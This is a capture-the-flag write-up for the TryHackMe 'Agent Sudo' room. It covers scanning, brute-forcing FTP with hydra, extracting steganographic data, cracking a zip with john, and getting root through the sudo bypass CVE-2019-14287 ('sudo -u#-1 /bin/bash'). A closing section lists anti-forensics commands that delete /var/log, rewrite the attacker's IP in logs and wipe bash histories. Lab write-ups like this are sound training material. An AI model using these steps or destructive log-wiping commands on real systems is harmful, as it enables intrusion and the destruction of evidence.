---
title: "THM:agentsudoctf"
subtitle: "TryHackMe CTF room: https://tryhackme.com/room/agentsudoctf"
category: "CTF"
tags: ctf,nmap,nikto,gobuster,dirbuster,steganography,steghide,binwalk,john,zip2john,apache,ubuntu,CVE-2019–14287
---
# THM:Agent Sudo

URL: [https://tryhackme.com/room/agentsudoctf](https://tryhackme.com/room/agentsudoctf) [Easy]

Tags: 
<div style="margin-left: 5px;">
{% assign tags = page.tags | split: "," %}
{% for tag in tags %}
<a href="../search/?q={{tag}}" title="Click to search by this tag"><span class="badge bg-secondary">{{tag}}</span></a>
{% endfor %}
</div>
<hr>

## Reconnaissance

Description of the room:

> You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.

## Scanning

### Running: `nmap`

Ran the following:

> `nmap -sC -sV xxx.xxx.xxx.xxx`

Interesting ports found to be open:

```python
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

*Also see: [nmap.log](nmap.log)*

### Running: `gobuster`

Ran the following:

> `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://xxx.xxx.xxx.xxx`

Interesting folders found:

```python
/index.php            (Status: 200) [Size: 218]
```

*Also see: [gobuster.log](gobuster.log)*

### Running: `nikto`

Ran the following:

> `nikto -h xxx.xxx.xxx.xxx`

Interesting info found:

```python
--Nothing really--
```

*Also see: [nikto.log](nikto.log)*

## Gaining Access

There isn't anything too interesting from scanning. We navigate to the web server running on this server and see:

```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
```

Per the instructions on the main web page, you can pass in your Agent name as the `User-Agent` on the web page to gain access. Since it was signed by "R", we can systematically try other letters. For example:

```bash
curl -H "User-Agent: C" -L http://10.10.13.116
```

From that, we can discern the username of "C". Since both SSH and FTP are services, let's try hydra against FTP with:

```python
hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.13.116 ftp
```

Sure enough, from that, we capture the FTP password for user `chris`. 

*Also see: [hydra.log](hydra.log)*

### Unprivileged Access

When we log into FTP as Chris, we have 3 files:

- [cute-alien.jpg](cute-alien.jpg)
- [cutie.png](cutie.png)
- [To-agentJ.txt](To_agentJ.txt)

We find out from the text file:

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture 
inside your directory. Your login password is somehow stored in the fake 
picture. It shouldn't be a problem for you.

From,
Agent C
```

By running:

```bash
steghide info ./cute-alien.jpg
```

We find that `cute-alien.jpg` has password-protected data in it. Using binwalk:

```bash
binwalk ./cutie.png 
```

We can see there is a .zip file embedded within:

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

So, we can do a:

```bash
binwalk -e ./cutie.png
```

to extract (`-e`) the hidden `.zip` file. That puts the embedded data into a `_cutie.png.extracted` subfolder. Within there, we have some files:

```bash
365
365.zlib
8702.zip
To_agentR.txt
```
The .zip file seems to be password-protected, so we can send that to John to crack:

```bash
zip2john ./8702.zip > ./8702.zip.hash
```

and then:

```bash
john ./8702.zip.hash
```

and very quickly, John finishes with the `.zip` file password:

```
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
alien            (8702.zip/To_agentR.txt)   
```

*Also see: [john.log](john.log)*

---

Now that we have the `.zip` file password, we can unzip the contents:

```bash
7z e ./8702.zip
```

We enter the password and `To_agentR.txt` gets extracted. The contents give us a perhaps-encoded word:

```text
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

Using a website like [https://www.base64decode.org/](https://www.base64decode.org/), we can pass in the value `QXJlYTUx` and get the value `Area51`.

We might assume that is the steg password for the other image. We try that:

```bash
steghide extract -sf ./cute-alien.jpg
```

That wrote out it's contents to [message.txt](message.txt) which is addressed to `james` and appears to have his password. 

Let's try that username/password over SSH - and sure-enough, we can log in and get the user flag, and the picture for the bonus question.

### Privilege Escalation

We check to see if have any sudo privileges with `sudo -l` and we see an odd:

```
(ALL, !root) /bin/bash
```

By looking this up on the internet, we find an associated [CVE-2019–14287](https://nvd.nist.gov/vuln/detail/CVE-2019-14287)

To run the exploit, instead of the intuitive:

```bash
sudo /bin/bash
```

Per the CVE writeups, you'd do the following to get a root prompt:

```bash
sudo -u#-1 /bin/bash
```


## Maintaining Access

TBD

## Clearing Tracks

This is a test machine. However, in a Red Team scenario, we could:

### Delete relevant logs from `/var/log/` - although that might draw attention.

> `rm -Rf /var/log/*`

### Search and replace our IP address in all logs via: 

> `find /var/log -name "*" -exec sed -i 's/10.10.2.14/127.0.0.1/g' {} \;`

### Wipe bash history for any accounts we used via: 

> `cat /dev/null > /root/.bash_history`
>  
> `cat /dev/null > /home/kathy/.bash_history`
>  
> `cat /dev/null > /home/sam/.bash_history`

## Summary

Completed: [<kbd>CTRL</kbd>+<kbd>SHFT</kbd>+<kbd>I</kbd>]